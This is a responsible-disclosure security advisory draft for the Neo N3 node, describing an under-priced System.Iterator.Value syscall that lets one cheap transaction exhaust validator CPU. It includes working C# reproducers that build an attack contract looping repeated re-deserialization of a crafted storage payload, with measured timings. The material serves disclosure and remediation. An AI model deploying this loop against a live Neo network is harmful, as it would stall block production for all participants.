## neo-project/neo
Private audit · GHSA draft for [neo-project/neo](https://github.com/neo-project/neo), branch `master-n3`

Neo N3's C# node. `System.Iterator.Value` is registered at a flat price of 16 datoshi, but when the
iterator is a `StorageIterator` created with `FindOptions.DeserializeValues`, every `Value()` call
re-runs a full `BinarySerializer.Deserialize` of the entry's attacker-controlled value — up to
65,535 bytes, deserializing to ~2,048 stack items — caching nothing, and `Value()` does not advance
the iterator so the same element can be re-read in a tight loop for the flat fee. Under
`PickField0`/`PickField1` the transient array is discarded and never reference-counted. Measured on
a Release build: 3,000 calls charged 0.0365 GAS while consuming 0.56 s of node CPU — ~15.2
node-CPU-seconds forced per 1 GAS paid — and ~0.46 GAS per block sustains a full 15-second
block-time of CPU on every validating node: a network-wide liveness failure from one cheap, valid,
permissionless transaction. The document below is the complete GHSA submission draft (title,
description, affected products, severity, weaknesses) with the three reproducers — unit level,
on-chain execution through the real `ApplicationEngine` with real metering, and a local-chain
regtest.

- **Audited ref:** `master-n3` @ `268175a8e1bba39c11a81723796bef1c9d11e1bd` (dev version 3.10.2)
- **Weakness:** CWE-400 (uncontrolled resource consumption) · CWE-405 (asymmetric resource consumption) · CWE-770 (allocation without limits)
- **Affected:** `>= 3.0.0`, all of Neo N3 (`DeserializeValues`, `PickField*` and the flat price have been present since N3); no patch at time of report
- **Disclosure:** private GitHub security advisory draft for the repository's "Report a vulnerability" form
- **PoC:** [`poc/neo-iterator-value-dos-test.cs`](./poc/neo-iterator-value-dos-test.cs) (unit + on-chain engine reproducers), [`poc/neo-iterator-value-dos-regtest.cs`](./poc/neo-iterator-value-dos-regtest.cs) (local-chain regtest)

**Severity — researcher analysis (per the advisory draft's own selection).** High. Neo bounty
taxonomy "all network fail" (CVSS v3.1 7.7, `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H`; PR:N
is defensible on a permissionless chain and would raise it to 8.6). Availability-only impact: no
asset loss, no state corruption.

---

# GitHub Security Advisory for neo-project/neo

> Draft for the repository's private "Report a vulnerability" form. Each top-level section below maps to one field of that form, so you can copy them across one to one. All code citations are permalinked to commit `268175a8e1bba39c11a81723796bef1c9d11e1bd`, branch `master-n3`, dev version `3.10.2`. That is the tree that was built and tested.

---

## Title

Under-priced `System.Iterator.Value` lets a cheap transaction exhaust every node and stall block production, because storage is re-deserialized on every call with no cache.

---

## Description

### Summary

`System.Iterator.Value` is registered at a flat price of `1 << 4`, which is 16 datoshi. When the iterator underneath is a `StorageIterator` created with `FindOptions.DeserializeValues`, every call to `Value()` re-runs a full `BinarySerializer.Deserialize` of the entry's value. That value is attacker-controlled and can be up to 65,535 bytes, which deserializes to as many as about 2,048 stack items. Nothing is cached. `Value()` does not advance the iterator, so a contract can call `System.Iterator.Value` in a tight loop on the same element, paying the flat 16 datoshi each time while forcing the node to repeat the whole deserialization. Under `FindOptions.PickField0` or `PickField1` the deserialized array is thrown away, so the transient array, up to about 2,048 items, never reaches the eval stack and the VM reference counter never accounts for it either.

The result is a large gap between the fee charged and the CPU and memory work performed on every validating node, and the attacker chooses how large that gap is. Kept up, it slows block execution on all nodes and stalls block production. That is a network-wide availability failure, a denial of service against chain liveness. It needs no special privileges, no role, no committee membership, and no victim interaction. Any account that can deploy a contract and pay ordinary gas can trigger it.

This report was validated by building the full solution and running three reproducers against the real code. One is unit level, one drives on-chain execution with real gas metering, and one runs a local chain, a regtest. All figures below come from a Release build.

### Affected component and root cause

First, the interop is flat priced and its handler adds no work-based fee.

`src/Neo/SmartContract/ApplicationEngine.Iterator.cs:29`
```csharp
public static readonly InteropDescriptor System_Iterator_Value =
    Register("System.Iterator.Value", nameof(IteratorValue), 1 << 4, CallFlags.None);
```
`ApplicationEngine.Iterator.cs:48-51`
```csharp
internal protected StackItem IteratorValue(IIterator iterator)
{
    return iterator.Value();
}
```
The only charge for a syscall is the fixed price times the exec-fee-factor, applied in `OnSysCall`.

`src/Neo/SmartContract/ApplicationEngine.cs:1057-1060`
```csharp
protected virtual void OnSysCall(InteropDescriptor descriptor)
{
    ValidateCallFlags(descriptor.RequiredCallFlags);
    AddFee(descriptor.FixedPrice * _execFeeFactor, false);   // 16 * 30 = 480 datoshi, regardless of work
```
There is no size-based or dynamic component on this path. The Huyao dynamic-pricing work, `DynamicPriceTable` and `OpCodePriceTable`, is keyed by VM opcode. `OnSysCall` throws away its `RunStats`, and interops are not covered.

Second, `StorageIterator.Value()` re-deserializes the whole value on every call, caches nothing, and discards it under PickField.

`src/Neo/SmartContract/Iterators/StorageIterator.cs:43-65`
```csharp
public StackItem Value()
{
    ReadOnlyMemory<byte> key = enumerator.Current.Key.Key;
    ReadOnlyMemory<byte> value = enumerator.Current.Value.Value;

    if (options.HasFlag(FindOptions.RemovePrefix))
        key = key[prefixLength..];

    StackItem item = options.HasFlag(FindOptions.DeserializeValues)
        ? BinarySerializer.Deserialize(value, ExecutionEngineLimits.Default)   // <-- FULL re-deserialize, EVERY call
        : value;

    if (options.HasFlag(FindOptions.PickField0))
        item = ((Array)item)[0];        // <-- ~2048-item array built then discarded
    else if (options.HasFlag(FindOptions.PickField1))
        item = ((Array)item)[1];

    if (options.HasFlag(FindOptions.KeysOnly))
        return key;
    if (options.HasFlag(FindOptions.ValuesOnly))
        return item;
    return new Struct() { key, item };
}
```
`Next()` is a separate method, `StorageIterator.cs:38-41`, so `Value()` does not advance. The same element can be re-read as many times as the attacker wants.

Third, the deserialization is unmetered and uncounted.
- `BinarySerializer.Deserialize(ReadOnlyMemory<byte>, ExecutionEngineLimits)`, `src/Neo/SmartContract/BinarySerializer.cs:56`, takes no `ReferenceCounter`, so the transient items are never counted against the VM stack limit.
- The deserializer allocates up to `ExecutionEngineLimits.Default.MaxStackSize`, about 2,048 items, in two passes, `BinarySerializer.cs:80-162`, and it contains no `AddFee` or `AddGas`.
- The value size is attacker-controlled up to `MaxStorageValueSize`, which is `ushort.MaxValue`, 65,535, `src/Neo/SmartContract/ApplicationEngine.Storage.cs:30`.

Fourth, the option combination is accepted. `DeserializeValues | PickField0 | ValuesOnly` passes `ValidateFindOptions`, `ApplicationEngine.Storage.cs:217-241`, and `Find` returns a `StorageIterator` over it, `ApplicationEngine.Storage.cs:192-196`.

### Preconditions and privileges

There is no admin, committee, role, or victim-signature requirement. The attacker needs only three things.
- Deploy a contract. This is permissionless through `ContractManagement.Deploy`, for the minimum deployment fee of 10 GAS, `src/Neo/SmartContract/Native/ContractManagement.cs:57`, the value `10_00000000`. `SetMinimumDeploymentFee` is committee only, but deploying is not.
- Run the loop from that contract. This is the only structural requirement, because `System.Storage.GetContext` resolves the caller as a deployed contract, `ApplicationEngine.Storage.cs:113-122`.
- Hold the ordinary CallFlags that every contract already has. `Storage.Find` needs `ReadStates`, `Storage.Put` needs `WriteStates` on its own storage, and `Iterator.Value` and `Next` need `None`.

One-time setup cost. A live attacker pays, once, for contract deployment, at least 10 GAS, plus storing the crafted payload. `Put` charges the new data size times StoragePrice, `ApplicationEngine.Storage.cs:306`. `DefaultStoragePrice` is 100000 datoshi per byte, which is 0.001 GAS per byte, `PolicyContract.cs:40`. An item-dense payload of about 8 KB, 2,047 integers giving roughly 2,048 deserialized items, is the best trade-off between amplification and cost. It costs about 8 GAS and already gives about 150 to 167 times amplification. A full 64 KB payload costs about 61 GAS. A realistic one-time setup is around 18 GAS, and it is reusable across every later block. The sustained cost after that is around 0.46 GAS per block.

No protocol cap bounds the damage. `ProtocolSettings` defines `MaxTransactionsPerBlock`, 512, and `MaxTransactionSize`, 102,400 bytes, but there is no `MaxBlockSystemFee`. Total per-block execution work is not capped, so blocks can be packed with high-SystemFee attack transactions.

### Impact

Every consensus and validating node executes every transaction in a block during `Blockchain.Persist`, `src/Neo/Ledger/Blockchain.cs:410-453`, where `ApplicationEngine.Create(..., tx.SystemFee)` is followed by `engine.Execute()`. The mispriced loop therefore forces disproportionate CPU on all nodes. Measured on a Release build with .NET 10.

- Fee against work. The fee is identical, 16 datoshi, but a 2,047-item payload costs about 167 times the CPU of a 1-item payload.
- On-chain gas against work. 3,000 `System.Iterator.Value` calls were charged 0.0365 GAS, taken from `engine.FeeConsumed`, while consuming about 0.56 seconds of node CPU. That is about 15 node-CPU-seconds forced for every 1 GAS paid.
- Chain liveness. On a running local chain, a single transaction, about 0.024 GAS of `Iterator.Value` calls, made a block persist in about 778 ms against about 3.5 ms for an empty block, roughly 220 times slower. At the default 15-second block time, about 0.46 GAS per block sustains a full block-time of CPU on every node. Nodes then fall behind block production, which is a network-wide liveness failure.

This is an availability impact. There is no asset loss and no state corruption. In Neo's own bounty severity taxonomy it maps to High, "all network fail."

### Proof of concept

Environment. The full solution was built with `dotnet build neo.sln -c Release`, all 10 projects, 0 warnings and 0 errors, SDK .NET 10.0.112, commit `268175a`. All three tests pass in Release, and in Debug.

A note on the test shortcuts against a live attack. For measurement convenience, `IteratorValue_OnChainExecution` pushes a `StorageContext` directly, and `OnChain_Regtest` injects the attack contract and payload into the store and funds the sender. These front-load only the one-time setup that a live attacker pays, described under Preconditions above. They do not change the per-call execution cost being measured.

#### Reproducer 1 and 2, tests/Neo.UnitTests/SmartContract/UT_IteratorValueDoS.cs

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Neo.SmartContract;
using Neo.SmartContract.Iterators;
using Neo.SmartContract.Native;
using Neo.VM;
using Neo.VM.Types;
using VMArray = Neo.VM.Types.Array;

namespace Neo.UnitTests.SmartContract
{
    [TestClass]
    public class UT_IteratorValueDoS
    {
        private static byte[] SerializedIntArray(int count)
        {
            var arr = new VMArray();
            for (int i = 0; i < count; i++) arr.Add(i);
            return BinarySerializer.Serialize(arr, ExecutionEngineLimits.Default);
        }

        private static byte[] SerializedMaxPayload()
        {
            var arr = new VMArray();
            for (int i = 0; i < 2047; i++) arr.Add(new byte[28]);
            var bytes = BinarySerializer.Serialize(arr, ExecutionEngineLimits.Default);
            Assert.IsTrue(bytes.Length <= ApplicationEngine.MaxStorageValueSize);
            return bytes;
        }

        private static StorageIterator MakeIterator(byte[] serializedValue, FindOptions options)
        {
            var key = new StorageKey { Id = 1, Key = new byte[] { 1 } };
            var item = new StorageItem(serializedValue);
            var seq = new List<(StorageKey, StorageItem)> { (key, item) };
            var it = new StorageIterator(seq.GetEnumerator(), 0, options);
            it.Next();
            return it;
        }

        private static double TimeCalls(byte[] payload, FindOptions options, int n)
        {
            var it = MakeIterator(payload, options);
            var sw = Stopwatch.StartNew();
            for (int i = 0; i < n; i++) _ = it.Value();
            sw.Stop();
            return sw.Elapsed.TotalMilliseconds;
        }

        [TestMethod]
        public void IteratorValue_FlatPriced_ReDeserializesFullPayloadEveryCall()
        {
            Assert.AreEqual(1 << 4, (int)ApplicationEngine.System_Iterator_Value.FixedPrice);
            var options = FindOptions.DeserializeValues | FindOptions.PickField0 | FindOptions.ValuesOnly;
            var small = SerializedIntArray(1);
            var large = SerializedIntArray(2047);
            const int N = 20000;

            var w = MakeIterator(large, options); for (int i = 0; i < 200; i++) _ = w.Value();
            var tSmall = TimeCalls(small, options, N);
            var tLarge = TimeCalls(large, options, N);

            Console.WriteLine($"payload bytes: small={small.Length}, large={large.Length}");
            Console.WriteLine($"N={N}, CONSTANT fee {ApplicationEngine.System_Iterator_Value.FixedPrice} datoshi/call:");
            Console.WriteLine($"  small(1)    : {tSmall / N * 1000,7:F2} us/call");
            Console.WriteLine($"  large(2047) : {tLarge / N * 1000,7:F2} us/call -> {tLarge / tSmall:F1}x for SAME fee");
            Assert.IsTrue(tLarge > tSmall * 5);
        }

        // ON-CHAIN EXECUTION: drive the attack through the real ApplicationEngine + gas metering
        // (the exact code path Blockchain.Persist runs per transaction), and measure the actual
        // FeeConsumed (on-chain gas charged) vs. the node CPU it forces.
        [TestMethod]
        public void IteratorValue_OnChainExecution_TrivialFeeMassiveCpu()
        {
            var snapshot = TestBlockchain.GetTestSnapshotCache();
            const int contractId = 0x4243;
            var prefix = new byte[] { (byte)'K' };
            snapshot.Add(new StorageKey { Id = contractId, Key = prefix }, new StorageItem(SerializedMaxPayload()));

            var options = FindOptions.DeserializeValues | FindOptions.PickField0 | FindOptions.ValuesOnly;
            const int N = 3000;

            using var sb = new ScriptBuilder();
            sb.EmitSysCall(ApplicationEngine.System_Storage_Find);   // (context, prefix, options) -> iterator
            sb.Emit(OpCode.DUP);
            sb.EmitSysCall(ApplicationEngine.System_Iterator_Next);  // advance to the single element
            sb.Emit(OpCode.DROP);
            for (int i = 0; i < N; i++)
            {
                sb.Emit(OpCode.DUP);
                sb.EmitSysCall(ApplicationEngine.System_Iterator_Value); // full re-deserialize, flat 16 fee
                sb.Emit(OpCode.DROP);
            }
            sb.Emit(OpCode.DROP);

            using var engine = ApplicationEngine.Create(TriggerType.Application, null, snapshot,
                settings: TestProtocolSettings.Default, gas: 1000_00000000L);
            engine.LoadScript(sb.ToArray(), configureState: state => state.CallFlags = CallFlags.ReadStates);
            engine.Push((int)options);
            engine.Push(prefix);
            engine.Push(new InteropInterface(new StorageContext { Id = contractId, IsReadOnly = true }));

            var sw = Stopwatch.StartNew();
            var vmstate = engine.Execute();
            sw.Stop();

            if (vmstate != VMState.HALT && engine.FaultException != null)
                Console.WriteLine("Fault: " + engine.FaultException);
            Assert.AreEqual(VMState.HALT, vmstate);

            long feeDatoshi = engine.FeeConsumed;
            double feeGas = feeDatoshi / 1e8;
            double ms = sw.Elapsed.TotalMilliseconds;
            double cpuSecPerGas = (ms / 1000.0) / feeGas;
            double gasToStall15s = 15.0 / (ms / 1000.0) * feeGas;

            Console.WriteLine($"ON-CHAIN execution of {N} System.Iterator.Value calls (real engine + metering):");
            Console.WriteLine($"  FeeConsumed (on-chain gas charged) = {feeDatoshi} datoshi = {feeGas:F6} GAS");
            Console.WriteLine($"  node CPU spent                     = {ms:F1} ms ({ms / N * 1000:F1} us/call)");
            Console.WriteLine($"  => node CPU forced per 1 GAS       = {cpuSecPerGas:F1} seconds");
            Console.WriteLine($"  => GAS to force one 15s block of CPU on EVERY node = {gasToStall15s:F3} GAS");

            Assert.IsTrue(feeGas < 0.05, $"on-chain fee should be trivial (was {feeGas:F6} GAS)");
            Assert.IsTrue(ms > 100, $"node CPU should be large (was {ms:F1} ms)");
            Assert.IsTrue(cpuSecPerGas > 5, $"amplification must be severe (was {cpuSecPerGas:F1} CPU-s/GAS)");
        }
    }
}
```

Observed output, Release.
```
IteratorValue_FlatPriced_ReDeserializesFullPayloadEveryCall
  payload bytes: small=4, large=8063
  N=20000, CONSTANT fee 16 datoshi/call:
    small(1)    :    1.1 us/call
    large(2047) :  185.8 us/call -> ~167x for SAME fee

IteratorValue_OnChainExecution_TrivialFeeMassiveCpu
  FeeConsumed (on-chain gas charged) = 3653801 datoshi = 0.036538 GAS   (3000 calls)
  node CPU spent                     = 555.5 ms (185.2 us/call)
  => node CPU forced per 1 GAS       = 15.2 seconds
  => GAS to force one 15s block of CPU on EVERY node = ~0.99 GAS
```

#### Reproducer 3, running local chain regtest, tests/Neo.UnitTests/SmartContract/UT_IteratorValueDoS_Regtest.cs

```csharp
using System;
using System.Diagnostics;
using System.Linq;
using System.Numerics;
using Akka.Actor;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Neo.Cryptography;
using Neo.Extensions;
using Neo.Ledger;
using Neo.Network.P2P.Payloads;
using Neo.Persistence;
using Neo.SmartContract;
using Neo.SmartContract.Manifest;
using Neo.SmartContract.Native;
using Neo.UnitTests.Extensions;
using Neo.VM;
using Neo.VM.Types;
using VMArray = Neo.VM.Types.Array;

namespace Neo.UnitTests.SmartContract
{
    [TestClass]
    public class UT_IteratorValueDoS_Regtest
    {
        private const int AttackContractId = 0x5555;
        private static readonly byte[] Prefix = { 1 };

        private static byte[] SerializedMaxPayload()
        {
            var arr = new VMArray();
            for (int i = 0; i < 2047; i++) arr.Add(new byte[28]);
            return BinarySerializer.Serialize(arr, ExecutionEngineLimits.Default);
        }

        // Attack contract body (offset 0): GetContext; Find(DeserializeValues|PickField0|ValuesOnly);
        // Next once; N x (DUP; Iterator.Value; DROP); DROP; PUSHNULL. Storage value pre-seeded.
        private static byte[] BuildAttackScript(int n)
        {
            var options = (int)(FindOptions.DeserializeValues | FindOptions.PickField0 | FindOptions.ValuesOnly);
            using var sb = new ScriptBuilder();
            sb.EmitPush(options);                                     // options
            sb.EmitPush(Prefix);                                      // prefix
            sb.EmitSysCall(ApplicationEngine.System_Storage_GetContext); // -> context (top)
            sb.EmitSysCall(ApplicationEngine.System_Storage_Find);      // (ctx,prefix,options) -> iterator
            sb.Emit(OpCode.DUP);
            sb.EmitSysCall(ApplicationEngine.System_Iterator_Next);     // advance to element
            sb.Emit(OpCode.DROP);
            for (int i = 0; i < n; i++)
            {
                sb.Emit(OpCode.DUP);
                sb.EmitSysCall(ApplicationEngine.System_Iterator_Value); // full re-deserialize, flat 16 fee
                sb.Emit(OpCode.DROP);
            }
            sb.Emit(OpCode.DROP);
            sb.Emit(OpCode.PUSHNULL);
            return sb.ToArray();
        }

        private static Block MakeBlock(NeoSystem system, params Transaction[] txs)
        {
            var view = system.StoreView;
            var index = NativeContract.Ledger.CurrentIndex(view) + 1;
            var prev = NativeContract.Ledger.CurrentHash(view);
            var merkle = txs.Length == 0 ? UInt256.Zero : MerkleTree.ComputeRoot(txs.Select(t => t.Hash).ToArray());
            return new Block
            {
                Header = new Header
                {
                    Version = 0,
                    PrevHash = prev,
                    MerkleRoot = merkle,
                    Timestamp = TimeProvider.Current.UtcNow.ToTimestampMS() + index,
                    Index = index,
                    Nonce = 0,
                    NextConsensus = UInt160.Zero,
                    Witness = Witness.Empty,
                },
                Transactions = txs
            };
        }

        private static double ImportAndTime(NeoSystem system, Block block)
        {
            var sw = Stopwatch.StartNew();
            system.Blockchain.Ask<Blockchain.ImportCompleted>(new Blockchain.Import(new[] { block }, false),
                TimeSpan.FromSeconds(120)).GetAwaiter().GetResult();
            sw.Stop();
            return sw.Elapsed.TotalMilliseconds;
        }

        [TestMethod]
        public void OnChain_Regtest_AttackBlockStallsPersist()
        {
            // 1) Real local chain (SoleNode private net); genesis persisted.
            var system = new TestBlockchain.TestNeoSystem(TestProtocolSettings.SoleNode);
            system.ResetStore();

            var sender = UInt160.Zero; // persist does not verify witnesses; fund this account directly
            var attackScript = BuildAttackScript(5000);
            var attackHash = attackScript.ToScriptHash();
            var nef = new NefFile { Compiler = "", Source = "", Tokens = [], Script = attackScript };
            nef.CheckSum = NefFile.ComputeChecksum(nef);
            var contract = new ContractState
            {
                Id = AttackContractId,
                UpdateCounter = 0,
                Nef = nef,
                Hash = attackHash,
                Manifest = TestUtils.CreateManifest("attack", ContractParameterType.Any)
            };

            // 2) Commit setup to the store: fund sender GAS, deploy attack contract, pre-seed ~61KB value.
            {
                var snap = system.GetSnapshotCache();
                var gasKey = new KeyBuilder(NativeContract.GAS.Id, 20).Add(sender); // Prefix_Account = 20
                snap.Add(gasKey, new StorageItem(new AccountState { Balance = new BigInteger(1_000_000_00000000L) }));
                snap.AddContract(attackHash, contract);
                snap.Add(new StorageKey { Id = AttackContractId, Key = Prefix }, new StorageItem(SerializedMaxPayload()));
                snap.Commit();
            }

            // 3) Baseline: an empty block.
            var baselineMs = ImportAndTime(system, MakeBlock(system));

            // 4) Attack block: one tx invoking the attack contract. SystemFee funds the loop (attacker pays it).
            using var callScript = new ScriptBuilder();
            callScript.EmitDynamicCall(attackHash, "attack");
            var currentIndex = NativeContract.Ledger.CurrentIndex(system.StoreView);
            var attackTx = new Transaction
            {
                Version = 0,
                Nonce = 42,
                SystemFee = 10_00000000L,  // 10 GAS budget; the loop uses far less
                NetworkFee = 1_00000000L,
                ValidUntilBlock = currentIndex + 100,
                Attributes = [],
                Signers = [new Signer { Account = sender, Scopes = WitnessScope.CalledByEntry }],
                Script = callScript.ToArray(),
                Witnesses = [Witness.Empty],
            };

            var attackMs = ImportAndTime(system, MakeBlock(system, attackTx));

            Console.WriteLine("REGTEST — real local chain, real block persist:");
            Console.WriteLine($"  empty block   persist = {baselineMs,8:F1} ms");
            Console.WriteLine($"  attack block  persist = {attackMs,8:F1} ms   (1 tx, SystemFee budget 10 GAS)");
            Console.WriteLine($"  attack tx system fee actually consumed ~ {5000 * 16 * 30 / 1e8:F4} GAS (5000 Iterator.Value calls)");
            double blockBudgetMs = 15000; // SoleNode inherits Default MillisecondsPerBlock
            Console.WriteLine($"  attack block used {attackMs / blockBudgetMs * 100:F1}% of the 15s block budget for ~0.024 GAS");
            Console.WriteLine($"  => scaling to a full block-time stall costs ~{blockBudgetMs / attackMs * (5000 * 16 * 30 / 1e8):F3} GAS/block");

            Assert.IsTrue(attackMs > baselineMs * 20,
                $"attack block must persist far slower than an empty block (attack={attackMs:F0}ms, empty={baselineMs:F0}ms)");
            Assert.IsTrue(attackMs > 500, $"attack block persist should be clearly heavy (was {attackMs:F0}ms)");
        }
    }
}
```

Observed output, Release.
```
REGTEST — real local chain, real block persist:
  empty block   persist =      3.5 ms
  attack block  persist =    778.3 ms   (1 tx, SystemFee budget 10 GAS)
  attack tx system fee actually consumed ~ 0.0240 GAS (5000 Iterator.Value calls)
  attack block used 5.2% of the 15s block budget for ~0.024 GAS
  => scaling to a full block-time stall costs ~0.463 GAS/block
```

How to run.
```bash
git clone https://github.com/neo-project/neo && cd neo   # commit 268175a
# place the two files above under tests/Neo.UnitTests/SmartContract/
dotnet build neo.sln -c Release
dotnet test tests/Neo.UnitTests/Neo.UnitTests.csproj -c Release \
  --filter "FullyQualifiedName~UT_IteratorValueDoS" \
  --logger "console;verbosity=detailed"
```

### Severity assessment

Neo bounty taxonomy. High, "all network fail." Every validator executes every block's transactions, so a single cheap transaction that inflates block-execution CPU degrades the whole network's block production. "Single node failure," which is Medium, understates it. "Severe asset loss," which is Critical, does not apply, because there is no asset loss.

CVSS v3.1. 7.7, High, vector `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H`. The per-metric justification is in the Severity section below. If Privileges Required is scored None, which is defensible on a permissionless chain, the score rises to 8.6. If Scope is scored Unchanged, it falls to about 6.5. Under the most defensible reading it sits firmly in High.

### Suggested remediation

Any one of these fixes it, and the first is the cleanest.
1. Price `System.Iterator.Value` by the size of the deserialized payload, in bytes or item count or both, when `DeserializeValues` is set. This mirrors how `Storage.Get` and `Put` already price by size.
2. Cache the deserialized value for the current position inside `StorageIterator`, so repeated `Value()` calls on the same element do not re-deserialize.
3. Account the transient allocation against the VM reference counter, or a work fee, even when `PickField0` or `PickField1` discards it. For example, pass a `ReferenceCounter` into the `BinarySerializer.Deserialize` used here.

### Prior art and novelty

A repo-scoped GitHub full-text search, issues and PRs, all states, for `DeserializeValues`, `StorageIterator`, `Iterator.Value`, `PickField0`, and iterator gas, price, fee, and DoS wording found no report of this vector. The nearest results are all different. Issue #2683 is a GetCandidates unbounded-result DoS. Pull #4743 is buffer-pool memory management on the DeserializeValues path, not pricing. Issue #4525 is a performance report on .NET iterator and LINQ overhead. Issue #2228 is about FindOptions validation consistency. The broader under-priced-op class is being worked on for VM opcodes, #3535, #3600, and merged #4536, but that work does not cover interops or `Deserialize`. The defect is confirmed still present on `master-n3` at `268175a`.

### Disclosure note

All analysis was performed locally against a private regtest chain. Nothing was broadcast to testnet or mainnet, and no third-party funds or accounts were involved. The reproducers are minimal demonstrations of the defect, not weaponized exploits. Please keep this report private until a fix ships.

---

## Affected products

| Field | Value |
|---|---|
| Ecosystem | NuGet |
| Package name | `Neo` |
| Affected versions | `>= 3.0.0`, all of Neo N3. The `DeserializeValues` and `PickField` `FindOptions`, and the flat `System.Iterator.Value` price, have been present since N3. Confirmed on `master-n3` at `268175a`, dev version `3.10.2`, and by inspection of the latest release, `3.10.1`. |
| Patched versions | None |

The same source also ships as `neo-cli` and `neo-gui`. The vulnerable code lives in the `Neo` core package.

---

## Severity

Selected severity. High.
CVSS v3.1 base score. 7.7.
Vector string. `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H`.

Per-metric selections, for the form's radio groups.

| Metric | Selection | Justification |
|---|---|---|
| Attack Vector | Network (N) | Exploited by broadcasting an ordinary transaction to the P2P or RPC network. No local or adjacent access is needed. |
| Attack Complexity | Low (L) | Deterministic. No race, and no special target state. Craft a payload, deploy, loop the syscall. |
| Privileges Required | Low (L) | Needs a funded account that can deploy a contract and pay gas, but no role, committee, or admin authorization. PR None is defensible on a permissionless chain and would raise the score to 8.6. PR Low is the conservative choice. |
| User Interaction | None (N) | No victim action is required. |
| Scope | Changed (C) | The attacker's sandboxed contract, whose security scope is metered VM execution, degrades the availability of the node and consensus, a different security scope that the VM metering is meant to protect. |
| Confidentiality | None (N) | No information is disclosed. |
| Integrity | None (N) | No state or data is corrupted. Faulted transactions roll back normally. |
| Availability | High (H) | A sustainable, cheap, network-wide stall of block production, a chain-liveness failure. |

---

## Weaknesses (CWE)

- CWE-400, Uncontrolled Resource Consumption. This is the primary weakness.
- CWE-405, Asymmetric Resource Consumption, Amplification.
- CWE-770, Allocation of Resources Without Limits or Throttling.
